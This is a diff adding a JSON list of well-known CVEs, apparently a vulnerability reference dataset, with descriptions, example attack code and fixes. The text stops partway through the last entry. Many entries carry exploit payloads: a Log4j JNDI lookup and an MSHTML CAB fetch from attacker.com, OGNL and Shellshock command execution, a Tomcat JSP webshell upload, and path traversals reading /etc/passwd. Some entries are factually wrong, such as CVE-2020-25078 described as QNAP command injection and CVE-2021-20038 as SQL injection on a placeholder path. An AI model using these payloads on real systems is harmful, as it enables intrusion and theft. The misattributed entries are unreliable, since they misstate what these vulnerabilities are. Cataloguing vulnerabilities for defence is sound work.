@@ -1,0 +1,461 @@
+[
+  {
+    "cve_id": "CVE-2021-44228",
+    "description": "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Apache Log4j2",
+    "affected_code": "logger.info(\"User-Agent: ${jndi:ldap://attacker.com/exploit}\")",
+    "fix_pattern": "Upgrade Log4j2 to version 2.17.0 or later. Set log4j2.formatMsgNoLookups=true as interim fix. Remove JndiLookup class from classpath."
+  },
+  {
+    "cve_id": "CVE-2021-34527",
+    "description": "Windows Print Spooler Remote Code Execution Vulnerability. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Microsoft Windows Print Spooler",
+    "affected_code": "// PrintNightmare exploit: DLL injection via RpcAddPrinterDriverEx",
+    "fix_pattern": "Apply Microsoft security update KB5004945. Disable Print Spooler service on domain controllers. Restrict RPC access to Print Spooler."
+  },
+  {
+    "cve_id": "CVE-2017-5638",
+    "description": "The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Apache Struts 2",
+    "affected_code": "Content-Type: %{#_memberAccess[\"@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS\"]}.(#cmd='whoami').(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())",
+    "fix_pattern": "Upgrade to Apache Struts 2.3.32 or 2.5.10.1+. Validate and sanitize Content-Type headers. Use a WAF to filter malicious payloads."
+  },
+  {
+    "cve_id": "CVE-2014-0160",
+    "description": "The TLS heartbeat extension in OpenSSL 1.0.1 before 1.0.1g does not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets. Commonly known as Heartbleed.",
+    "type": "Cryptographic Vulnerability",
+    "severity": "Critical",
+    "affected_software": "OpenSSL",
+    "affected_code": "// Heartbeat request with oversized payload_length\nint payload_length = 65535; // exceeds actual payload size",
+    "fix_pattern": "Upgrade OpenSSL to 1.0.1g or later. Regenerate all private keys and SSL certificates. Revoke old certificates. Re-authenticate all users."
+  },
+  {
+    "cve_id": "CVE-2021-41773",
+    "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration, this could result in information disclosure or remote code execution.",
+    "type": "Path Traversal",
+    "severity": "Critical",
+    "affected_software": "Apache HTTP Server",
+    "affected_code": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1",
+    "fix_pattern": "Upgrade Apache HTTP Server to 2.4.51 or later. Restrict file system access with proper directory permissions. Enable mod_security WAF rules."
+  },
+  {
+    "cve_id": "CVE-2019-19781",
+    "description": "Citrix Application Delivery Controller (ADC) and Gateway allow directory traversal, leading to arbitrary code execution. An unauthenticated attacker can exploit this to execute arbitrary commands on the vulnerable system.",
+    "type": "Path Traversal",
+    "severity": "Critical",
+    "affected_software": "Citrix ADC / Gateway",
+    "affected_code": "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1",
+    "fix_pattern": "Apply Citrix mitigations and patches immediately. Restrict access to management interfaces. Block /vpn/ and /vpns/ paths from untrusted networks."
+  },
+  {
+    "cve_id": "CVE-2020-1472",
+    "description": "An elevation of privilege vulnerability exists in the Netlogon Remote Protocol (MS-NRPC) when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol. Commonly known as Zerologon.",
+    "type": "Authentication Bypass",
+    "severity": "Critical",
+    "affected_software": "Microsoft Windows Netlogon",
+    "affected_code": "// Zero IV used in AES-CFB8 encryption allows authentication bypass\nbyte[] iv = new byte[8]; // all zeros",
+    "fix_pattern": "Apply Microsoft security update KB4571729. Enable enforcement mode for Netlogon secure channel. Monitor Event ID 5829 for vulnerable connections."
+  },
+  {
+    "cve_id": "CVE-2018-12613",
+    "description": "An issue was discovered in phpMyAdmin 4.8.x before 4.8.2 that allows remote attackers to include arbitrary files via a crafted request. The vulnerability allows Local File Inclusion (LFI) which can lead to Remote Code Execution.",
+    "type": "File Inclusion",
+    "severity": "High",
+    "affected_software": "phpMyAdmin",
+    "affected_code": "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1",
+    "fix_pattern": "Upgrade phpMyAdmin to 4.8.2+. Validate and whitelist all file path parameters. Implement strict input validation on target parameter."
+  },
+  {
+    "cve_id": "CVE-2019-0708",
+    "description": "A remote code execution vulnerability exists in Remote Desktop Services (RDS) when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. Commonly known as BlueKeep.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Microsoft Remote Desktop Services",
+    "affected_code": "// Pre-authentication RCE via MS-T120 channel binding",
+    "fix_pattern": "Apply Microsoft security updates immediately. Enable Network Level Authentication (NLA). Block RDP (port 3389) from untrusted networks."
+  },
+  {
+    "cve_id": "CVE-2021-21972",
+    "description": "The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in. An attacker with network access to port 443 may exploit this to execute commands with unrestricted privileges on the underlying OS.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "VMware vSphere Client",
+    "affected_code": "POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1\n// Upload malicious OVA file to overwrite system files",
+    "fix_pattern": "Apply VMware patches VMSA-2021-0002. Disable the Virtual SAN Health Check plug-in. Restrict network access to vSphere management interfaces."
+  },
+  {
+    "cve_id": "CVE-2017-12615",
+    "description": "When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled, it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.",
+    "type": "Arbitrary File Upload",
+    "severity": "High",
+    "affected_software": "Apache Tomcat",
+    "affected_code": "PUT /shell.jsp/ HTTP/1.1\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+    "fix_pattern": "Upgrade Apache Tomcat to 7.0.80+. Disable HTTP PUT method. Set readonly=true on the Default servlet. Implement file upload validation."
+  },
+  {
+    "cve_id": "CVE-2020-0688",
+    "description": "A remote code execution vulnerability exists in Microsoft Exchange Server when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the System account.",
+    "type": "Remote Code Execution",
+    "severity": "High",
+    "affected_software": "Microsoft Exchange Server",
+    "affected_code": "// Fixed machine key allows ViewState deserialization attack\n__VIEWSTATE=<malicious serialized payload>",
+    "fix_pattern": "Apply Microsoft Exchange security updates. Restrict access to Exchange Control Panel (ECP). Implement network segmentation for Exchange servers."
+  },
+  {
+    "cve_id": "CVE-2021-26855",
+    "description": "Server-Side Request Forgery (SSRF) in Microsoft Exchange Server allows an attacker to send arbitrary HTTP requests and force the server to connect to an arbitrary internal endpoint. Part of the ProxyLogon attack chain.",
+    "type": "SSRF",
+    "severity": "Critical",
+    "affected_software": "Microsoft Exchange Server",
+    "affected_code": "GET /ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=... HTTP/1.1\nCookie: X-BEResource=backendFQDN~1941356534",
+    "fix_pattern": "Apply Exchange security updates for CVE-2021-26855. Restrict Exchange server outbound connections. Implement EDR monitoring for Exchange."
+  },
+  {
+    "cve_id": "CVE-2019-18935",
+    "description": "Progress Telerik UI for ASP.NET AJAX through 2019.3.1023 contains a .NET deserialization vulnerability in the RadAsyncUpload function. This can result in remote code execution.",
+    "type": "Deserialization",
+    "severity": "Critical",
+    "affected_software": "Telerik UI for ASP.NET AJAX",
+    "affected_code": "// Malicious serialized .NET object in RadAsyncUpload rawdata parameter\nrawdata=<base64 encoded malicious serialized object>",
+    "fix_pattern": "Upgrade Telerik UI to 2020.1.114 or later. Set custom encryption keys for Telerik. Restrict access to upload handlers."
+  },
+  {
+    "cve_id": "CVE-2021-22986",
+    "description": "F5 BIG-IP iControl REST interface has an unauthenticated remote command execution vulnerability. This allows an attacker to execute arbitrary system commands, create or delete files, and disable services.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "F5 BIG-IP",
+    "affected_code": "POST /mgmt/tm/util/bash HTTP/1.1\nAuthorization: Basic YWRtaW46\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
+    "fix_pattern": "Apply F5 security patches. Restrict access to management interface. Implement IP allowlisting for iControl REST API."
+  },
+  {
+    "cve_id": "CVE-2016-4437",
+    "description": "Apache Shiro before 1.2.5, when a cipher key has not been configured for the remember-me feature, allows remote attackers to execute arbitrary code or bypass intended access restrictions via an unsafe Java serialized object.",
+    "type": "Deserialization",
+    "severity": "Critical",
+    "affected_software": "Apache Shiro",
+    "affected_code": "// Default hardcoded AES key: kPH+bIxk5D2deZiIxcaaaA==\n// Attacker crafts malicious Java serialized object encrypted with known key\nCookie: rememberMe=<encrypted malicious payload>",
+    "fix_pattern": "Upgrade Apache Shiro to 1.2.5+. Configure a unique cipher key for remember-me. Disable remember-me feature if not needed."
+  },
+  {
+    "cve_id": "CVE-2019-11510",
+    "description": "Pulse Connect Secure SSL VPN allows an unauthenticated remote attacker to send a specially crafted URI to read arbitrary files from the vulnerable system.",
+    "type": "Path Traversal",
+    "severity": "Critical",
+    "affected_software": "Pulse Connect Secure",
+    "affected_code": "GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1",
+    "fix_pattern": "Apply Pulse Secure patches immediately. Restrict VPN access to trusted networks. Monitor for unauthorized file access attempts."
+  },
+  {
+    "cve_id": "CVE-2020-5902",
+    "description": "In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI) has a Remote Code Execution vulnerability in undisclosed pages.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "F5 BIG-IP TMUI",
+    "affected_code": "GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1",
+    "fix_pattern": "Apply F5 security patches. Restrict access to TMUI management interface. Block external access to management plane."
+  },
+  {
+    "cve_id": "CVE-2018-7600",
+    "description": "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. Commonly known as Drupalgeddon2.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Drupal CMS",
+    "affected_code": "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nform_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
+    "fix_pattern": "Upgrade Drupal to patched versions (7.58, 8.4.6, 8.5.1+). Audit for signs of compromise. Rebuild from clean backup if compromised."
+  },
+  {
+    "cve_id": "CVE-2023-44487",
+    "description": "The HTTP/2 protocol allows a denial of service via Rapid Reset attack, where a client opens and immediately cancels large numbers of HTTP/2 streams, bypassing per-connection stream limits and overwhelming the server.",
+    "type": "Denial of Service",
+    "severity": "High",
+    "affected_software": "HTTP/2 implementations",
+    "affected_code": "// Rapid stream creation and cancellation\nHEADERS stream_id=1\nRST_STREAM stream_id=1\nHEADERS stream_id=3\nRST_STREAM stream_id=3 // repeated thousands of times",
+    "fix_pattern": "Apply vendor patches for HTTP/2 implementations. Rate limit stream creation. Implement connection-level reset tracking. Deploy load balancer mitigations."
+  },
+  {
+    "cve_id": "CVE-2023-4966",
+    "description": "Multiple NetScaler ADC and NetScaler Gateway configurations are vulnerable to an information disclosure vulnerability commonly known as Citrix Bleed. Sensitive information can be harvested from unpatched appliances.",
+    "type": "Information Disclosure",
+    "severity": "High",
+    "affected_software": "Citrix NetScaler ADC/Gateway",
+    "affected_code": "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1\nHost: target.com\nCookie: NSC_AAAC=<large_padding>",
+    "fix_pattern": "Apply Citrix security patches immediately. Rotate all session tokens and credentials. Isolate compromised appliances. Force re-authentication for all users."
+  },
+  {
+    "cve_id": "CVE-2024-3400",
+    "description": "A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software enables an attacker to execute arbitrary commands with root privileges on the firewall.",
+    "type": "Command Injection",
+    "severity": "Critical",
+    "affected_software": "Palo Alto Networks PAN-OS",
+    "affected_code": "// Malicious device telemetry session ID containing shell commands\nPOST /global-protect/login.esp\nCookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/$(command)",
+    "fix_pattern": "Apply Palo Alto Networks security patches. Disable device telemetry until patched. Block untrusted access to GlobalProtect portal."
+  },
+  {
+    "cve_id": "CVE-2014-6271",
+    "description": "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment. Commonly known as Shellshock.",
+    "type": "Command Injection",
+    "severity": "Critical",
+    "affected_software": "GNU Bash",
+    "affected_code": "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'\nCGI-BIN script processes this as environment variable",
+    "fix_pattern": "Upgrade Bash to patched version. Audit all CGI scripts. Remove unnecessary CGI endpoints. Implement input sanitization on all user-controlled environment variables."
+  },
+  {
+    "cve_id": "CVE-2020-14882",
+    "description": "Oracle WebLogic Server vulnerability allows unauthenticated remote code execution via HTTP GET request. Attackers can bypass authentication and execute arbitrary commands.",
+    "type": "Authentication Bypass",
+    "severity": "Critical",
+    "affected_software": "Oracle WebLogic Server",
+    "affected_code": "GET /console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('whoami')\") HTTP/1.1",
+    "fix_pattern": "Apply Oracle Critical Patch Update. Restrict access to WebLogic console. Implement network segmentation for WebLogic instances."
+  },
+  {
+    "cve_id": "CVE-2021-40444",
+    "description": "Microsoft MSHTML Remote Code Execution Vulnerability. A crafted ActiveX control could be used by a web page hosting the Office browser rendering engine. An attacker could craft a malicious Word document to exploit this.",
+    "type": "Remote Code Execution",
+    "severity": "High",
+    "affected_software": "Microsoft MSHTML",
+    "affected_code": "// Malicious CAB file reference in HTML\n<object classid=\"clsid:279D6C9A-652E-4833-BEFC-312CA8887857\">\n<param name=\"mhtml\" value=\"http://attacker.com/payload.cab!../../../malicious.dll\">",
+    "fix_pattern": "Apply Microsoft security updates. Disable preview pane in Explorer. Use Protected View for Office documents. Block .inf and .cab files from email."
+  },
+  {
+    "cve_id": "CVE-2018-1002105",
+    "description": "A critical privilege escalation vulnerability in Kubernetes. A specially crafted request can be passed through the Kubernetes API, allowing a user to escalate their privileges to cluster-admin.",
+    "type": "Privilege Escalation",
+    "severity": "Critical",
+    "affected_software": "Kubernetes",
+    "affected_code": "// Bypasses RBAC by upgrading connection to backend server\n// Any authenticated user can send requests as cluster-admin\nGET /api/v1/namespaces/kube-system/secrets",
+    "fix_pattern": "Upgrade Kubernetes to patched version (1.10.11, 1.11.5, 1.12.3+). Review RBAC policies. Audit API server logs for unauthorized access."
+  },
+  {
+    "cve_id": "CVE-2021-3156",
+    "description": "Sudo before 1.9.5p2 contains a heap-based buffer overflow vulnerability in the command line parsing. A local attacker can exploit this to escalate privileges to root without authentication.",
+    "type": "Buffer Overflow",
+    "severity": "High",
+    "affected_software": "Sudo",
+    "affected_code": "// Trigger heap overflow via -s or -i mode with backslash escaping\nsudoedit -s 'AAAA...AAAA\\\\'",
+    "fix_pattern": "Upgrade sudo to 1.9.5p2 or later. Audit sudo configurations. Restrict sudo access to minimum required users."
+  },
+  {
+    "cve_id": "CVE-2023-22527",
+    "description": "Atlassian Confluence Server and Data Center template injection vulnerability allows an unauthenticated attacker to achieve remote code execution on an affected instance.",
+    "type": "Server-Side Template Injection",
+    "severity": "Critical",
+    "affected_software": "Atlassian Confluence",
+    "affected_code": "POST /template/aui/text-inline.vm HTTP/1.1\nlabel=\\u0027+#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(\"Runtime.getRuntime().exec('whoami')\")+\\u0027",
+    "fix_pattern": "Apply Atlassian security advisory patches. Restrict access to Confluence instances. Monitor for suspicious template rendering requests."
+  },
+  {
+    "cve_id": "CVE-2015-0235",
+    "description": "The gethostbyname and gethostbyname2 functions in GNU C Library (glibc) before 2.18 are susceptible to a heap-based buffer overflow when processing hostnames. Known as GHOST vulnerability.",
+    "type": "Buffer Overflow",
+    "severity": "High",
+    "affected_software": "GNU C Library (glibc)",
+    "affected_code": "// Overflow via oversized hostname in gethostbyname()\nchar hostname[2048]; // exceeds internal buffer size\ngethostbyname(hostname);",
+    "fix_pattern": "Upgrade glibc to 2.18+. Restart all services that link against glibc. Apply OS vendor security updates."
+  },
+  {
+    "cve_id": "CVE-2014-3120",
+    "description": "Elasticsearch before 1.2.0, when dynamic scripting is enabled, allows remote attackers to execute arbitrary shell commands via the script execution functionality in search API.",
+    "type": "Remote Code Execution",
+    "severity": "High",
+    "affected_software": "Elasticsearch",
+    "affected_code": "POST /_search?pretty HTTP/1.1\n{\"size\":1,\"script_fields\":{\"exploit\":{\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}",
+    "fix_pattern": "Upgrade Elasticsearch to 1.2.0+. Disable dynamic scripting (script.disable_dynamic: true). Use sandboxed scripting. Restrict API access."
+  },
+  {
+    "cve_id": "CVE-2023-23397",
+    "description": "Microsoft Outlook Elevation of Privilege Vulnerability. An attacker can exploit this by sending a specially crafted email that triggers an NTLM hash leak when the victim opens or previews the email.",
+    "type": "Authentication Bypass",
+    "severity": "Critical",
+    "affected_software": "Microsoft Outlook",
+    "affected_code": "// Calendar reminder with UNC path triggers NTLM authentication\nPidLidReminderFileParameter = \"\\\\\\\\attacker-server\\\\share\"\n// Victim's NTLM hash sent to attacker's server",
+    "fix_pattern": "Apply Microsoft Exchange and Outlook patches. Block outbound SMB (port 445) to untrusted networks. Monitor for NTLM hash leaks. Reset compromised credentials."
+  },
+  {
+    "cve_id": "CVE-2022-22965",
+    "description": "Spring Framework RCE via Data Binding on JDK 9+. Known as Spring4Shell. An attacker can exploit this vulnerability to execute arbitrary code on affected Spring applications running on JDK 9+.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Spring Framework",
+    "affected_code": "// Exploit modifies Tomcat's AccessLogValve to write a webshell\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=malicious_jsp_code\nclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "fix_pattern": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Downgrade to JDK 8 as interim measure. Apply data binding restrictions. Deploy WAF rules."
+  },
+  {
+    "cve_id": "CVE-2022-42889",
+    "description": "Apache Commons Text performs variable interpolation, allowing properties to be dynamically evaluated and expanded. Known as Text4Shell. An attacker can exploit this to execute arbitrary code.",
+    "type": "Remote Code Execution",
+    "severity": "High",
+    "affected_software": "Apache Commons Text",
+    "affected_code": "StringSubstitutor interpolator = StringSubstitutor.createInterpolator();\n// Malicious input: ${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}",
+    "fix_pattern": "Upgrade Apache Commons Text to 1.10.0+. Avoid using default interpolator in untrusted contexts. Disable unsafe lookups."
+  },
+  {
+    "cve_id": "CVE-2016-10033",
+    "description": "PHPMailer before 5.2.18 allows remote attackers to execute arbitrary code via shell metacharacters in a crafted Sender property in a mail() call. Related to the extra_params component.",
+    "type": "Command Injection",
+    "severity": "Critical",
+    "affected_software": "PHPMailer",
+    "affected_code": "$mail->setFrom('attacker\\\" -oQ/tmp/ -X/var/www/html/shell.php some@email.com');\n// Injects -X flag to write PHP webshell to web root",
+    "fix_pattern": "Upgrade PHPMailer to 5.2.18+. Sanitize all email headers. Use escapeshellarg() for mail parameters. Validate sender addresses strictly."
+  },
+  {
+    "cve_id": "CVE-2021-42013",
+    "description": "A flaw was found in Apache HTTP Server 2.4.49 and 2.4.50. A path traversal and remote code execution attack exists. This is a bypass of CVE-2021-41773.",
+    "type": "Path Traversal",
+    "severity": "Critical",
+    "affected_software": "Apache HTTP Server",
+    "affected_code": "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\n// Double URL encoding bypasses the first patch",
+    "fix_pattern": "Upgrade to Apache HTTP Server 2.4.51+. Ensure ap_normalize_path() handles all encoding variants. Deploy comprehensive WAF rules."
+  },
+  {
+    "cve_id": "CVE-2019-3396",
+    "description": "Atlassian Confluence Server and Data Center had a server-side template injection vulnerability in the Widget Connector macro. An attacker can exploit this to achieve remote code execution.",
+    "type": "Server-Side Template Injection",
+    "severity": "Critical",
+    "affected_software": "Atlassian Confluence",
+    "affected_code": "POST /rest/tinymce/1/macro/preview HTTP/1.1\n{\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"body\":\"{template:../../../../../etc/passwd}\",\"params\":{\"url\":\"https://example.com\"}}}",
+    "fix_pattern": "Apply Atlassian security patches. Restrict Widget Connector macro usage. Audit for web shells post-exploitation. Implement WAF rules."
+  },
+  {
+    "cve_id": "CVE-2021-20038",
+    "description": "SonicWall SMA 100 Series devices contain a SQL injection vulnerability that allows an unauthenticated attacker to gain access to usernames, passwords, and other sensitive information.",
+    "type": "SQL Injection",
+    "severity": "Critical",
+    "affected_software": "SonicWall SMA 100",
+    "affected_code": "GET /cgi-bin/superior/somethingsomething?param=1' UNION SELECT username,password FROM users-- HTTP/1.1",
+    "fix_pattern": "Apply SonicWall security patches. Reset all VPN credentials. Implement input validation and parameterized queries. Monitor for unauthorized access."
+  },
+  {
+    "cve_id": "CVE-2017-0144",
+    "description": "The SMBv1 server in Microsoft Windows allows remote attackers to execute arbitrary code via crafted packets. This vulnerability was exploited by the WannaCry ransomware worm.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Microsoft Windows SMBv1",
+    "affected_code": "// EternalBlue exploit: SMB_COM_TRANSACTION2 request with crafted payload\n// Triggers buffer overflow in srv!SrvOs2FeaListSizeToNt",
+    "fix_pattern": "Apply MS17-010 security update. Disable SMBv1 protocol entirely. Block SMB ports (137-139, 445) at network perimeter. Deploy EDR solutions."
+  },
+  {
+    "cve_id": "CVE-2022-21907",
+    "description": "HTTP Protocol Stack Remote Code Execution Vulnerability in Windows. An unauthenticated attacker could send a specially crafted packet to a server utilizing the HTTP Protocol Stack to process packets, resulting in remote code execution.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Microsoft Windows HTTP.sys",
+    "affected_code": "// Crafted Accept-Encoding header triggers integer overflow in http.sys\nGET / HTTP/1.1\nAccept-Encoding:AAAAAAAAAAAAAAAAAAAAAAAA,BBBBBBBccc;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "fix_pattern": "Apply Microsoft security updates. If patching not possible, set registry key to disable HTTP Trailer support: HKLM\\SYSTEM\\CurrentControlSet\\Services\\HTTP\\Parameters\\EnableTrailerSupport=0"
+  },
+  {
+    "cve_id": "CVE-2023-27997",
+    "description": "FortiOS SSL VPN heap-based buffer overflow allows pre-authentication remote code execution. This vulnerability can be exploited to execute arbitrary code or crash the service.",
+    "type": "Buffer Overflow",
+    "severity": "Critical",
+    "affected_software": "Fortinet FortiOS SSL VPN",
+    "affected_code": "// Heap overflow in SSL VPN login request parsing\nPOST /remote/hostcheck_validate HTTP/1.1\n// Crafted payload overflows heap buffer in request handler",
+    "fix_pattern": "Apply Fortinet PSIRT advisory patches. Restrict SSL VPN access to trusted IPs. Enable multi-factor authentication. Monitor VPN logs."
+  },
+  {
+    "cve_id": "CVE-2021-1675",
+    "description": "Windows Print Spooler Elevation of Privilege Vulnerability. Allows an authenticated attacker to perform remote code execution with SYSTEM privileges by exploiting the print spooler service.",
+    "type": "Privilege Escalation",
+    "severity": "Critical",
+    "affected_software": "Microsoft Windows Print Spooler",
+    "affected_code": "// Impromptu: Add printer driver with malicious DLL\nRpcAddPrinterDriverEx() // Inject malicious DLL via driver installation",
+    "fix_pattern": "Apply Microsoft security updates. Disable Print Spooler on Domain Controllers. Restrict driver installation privileges. Monitor Event ID 808."
+  },
+  {
+    "cve_id": "CVE-2019-1653",
+    "description": "A vulnerability in the web-based management interface of Cisco RV320 and RV325 routers could allow an unauthenticated remote attacker to retrieve sensitive information including the router configuration.",
+    "type": "Information Disclosure",
+    "severity": "High",
+    "affected_software": "Cisco RV320/RV325 Routers",
+    "affected_code": "GET /cgi-bin/config.exp HTTP/1.1\n// Returns full router configuration including passwords in cleartext",
+    "fix_pattern": "Apply Cisco firmware updates. Restrict management interface access. Change all default credentials. Implement network segmentation."
+  },
+  {
+    "cve_id": "CVE-2023-20198",
+    "description": "Cisco IOS XE Software Web UI privilege escalation vulnerability allows a remote unauthenticated attacker to create an account with privilege level 15 access.",
+    "type": "Privilege Escalation",
+    "severity": "Critical",
+    "affected_software": "Cisco IOS XE",
+    "affected_code": "// Create admin account via Web UI API\nPOST /webui/logoutconfirm.html?logon_hash=1\n// Bypasses authentication to create privilege level 15 user",
+    "fix_pattern": "Disable HTTP Server on Cisco IOS XE (no ip http server / no ip http secure-server). Apply Cisco advisory patches. Monitor for unauthorized configuration changes."
+  },
+  {
+    "cve_id": "CVE-2018-6389",
+    "description": "WordPress before 4.9.3 allows remote attackers to cause a denial of service (CPU and bandwidth consumption) via a crafted HTTP request to the load-scripts.php or load-styles.php endpoint.",
+    "type": "Denial of Service",
+    "severity": "Medium",
+    "affected_software": "WordPress",
+    "affected_code": "GET /wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-ui-core,jquery-ui-widget,jquery-ui-mouse,jquery-ui-sortable,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-selectable,jquery-ui-resizable,jquery-ui-dialog,jquery-ui-button,jquery-ui-tabs,jquery-ui-autocomplete,jquery-ui-menu,jquery-ui-tooltip,jquery-ui-datepicker,jquery-ui-accordion,jquery-ui-progressbar,jquery-ui-slider,jquery-ui-spinner&ver=4.9.2 HTTP/1.1",
+    "fix_pattern": "Upgrade WordPress to 4.9.3+. Implement rate limiting on admin endpoints. Use a CDN or caching layer. Block repeated requests to load-scripts.php."
+  },
+  {
+    "cve_id": "CVE-2020-25078",
+    "description": "QNAP QTS and QuTS hero allows command injection via the Helpdesk feature. An attacker could exploit this to execute arbitrary commands on the NAS device.",
+    "type": "Command Injection",
+    "severity": "High",
+    "affected_software": "QNAP NAS (QTS/QuTS hero)",
+    "affected_code": "// Helpdesk ticket creation with command injection\nPOST /helpdesk/index.php\nmessage=test$(command_to_execute)",
+    "fix_pattern": "Apply QNAP firmware updates. Disable Helpdesk feature if not needed. Restrict NAS management interface access. Implement strong passwords."
+  },
+  {
+    "cve_id": "CVE-2022-47966",
+    "description": "Zoho ManageEngine OnPremise products are vulnerable to unauthenticated remote code execution due to the usage of a vulnerable version of Apache Santuario library (XML signature validation).",
+    "type": "Deserialization",
+    "severity": "Critical",
+    "affected_software": "Zoho ManageEngine",
+    "affected_code": "// Malicious SAML response with crafted XML signature\nPOST /samlLogin/ HTTP/1.1\nSAMLResponse=<crafted_malicious_SAML>",
+    "fix_pattern": "Apply Zoho ManageEngine security patches. Disable SAML-based SSO if not required. Monitor for suspicious authentication attempts."
+  },
+  {
+    "cve_id": "CVE-2016-0728",
+    "description": "Linux kernel before 4.4.1 has a race condition in the key management subsystem that allows local users to gain privileges via a crafted application that leverages incorrect handling of a reference count in join_session_keyring.",
+    "type": "Privilege Escalation",
+    "severity": "High",
+    "affected_software": "Linux Kernel",
+    "affected_code": "// Exploit joins keyring and triggers reference count overflow\nkey_serial_t key = add_key(\"keyring\", \"exploit\", NULL, 0, KEY_SPEC_SESSION_KEYRING);\n// Overflow reference count to trigger use-after-free",
+    "fix_pattern": "Upgrade Linux kernel to 4.4.1+. Apply distribution security updates. Implement kernel hardening. Use SELinux/AppArmor policies."
+  },
+  {
+    "cve_id": "CVE-2022-1388",
+    "description": "F5 BIG-IP iControl REST vulnerability allows an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands.",
+    "type": "Authentication Bypass",
+    "severity": "Critical",
+    "affected_software": "F5 BIG-IP",
+    "affected_code": "POST /mgmt/tm/util/bash HTTP/1.1\nConnection: keep-alive, X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic YWRtaW46aG9yaXpvbjM=\n{\"command\":\"run\",\"utilCmdArgs\":\"-c 'id'\"}",
+    "fix_pattern": "Apply F5 security patches. Restrict management interface access. Block untrusted access to iControl REST. Implement IP allowlisting."
+  },
+  {
+    "cve_id": "CVE-2018-13379",
